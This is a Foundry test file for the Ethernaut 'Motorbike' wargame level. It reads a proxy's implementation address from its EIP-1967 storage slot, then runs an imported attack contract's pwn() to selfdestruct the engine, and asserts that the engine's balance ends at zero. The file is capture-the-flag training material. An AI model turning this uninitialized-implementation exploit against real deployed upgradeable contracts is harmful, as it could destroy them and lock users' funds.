// SPDX-License-Identifier: MIT
pragma solidity <0.7.0;
pragma experimental ABIEncoderV2;

import "forge-std/Test.sol";
import {MotorbikeFactory} from "src/levels/MotorbikeFactory.sol";
import {MotorbikeAttack} from "src/attacks/MotorbikeAttack.sol";

contract MotorbikeTest is Test {
    MotorbikeFactory level;
    address target;
    address player;

    function setUp() public {
        // ----------------------------------
        // Create level instance
        // ----------------------------------
        level = new MotorbikeFactory();
        player = makeAddr("PLAYER");
        target = level.createInstance(player);
    }

    function test_Motorbike() public {
        // ----------------------------------
        // Initiate attack
        // ----------------------------------
        vm.startPrank(player);

        bytes32 engineSlot = 0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc;
        address engineAddr = address(
            uint160(uint256(vm.load(target, engineSlot)))
        );

        // For validation: after attack, engine's balance should be zero
        vm.deal(engineAddr, 10 ether);

        MotorbikeAttack motorbikeAttack = new MotorbikeAttack(engineAddr);
        motorbikeAttack.pwn();

        vm.stopPrank();

        // ----------------------------------
        // Validate
        // ----------------------------------
        /*
            selfdestruct sends ethers and registers the account for later deletion,
            real destruction happens after transaction
            so validation through checking code size is not possible for forge test 
            finally, I changed validation method by checking engine's balance
        */
        assertEq(engineAddr.balance, 0);
    }
}
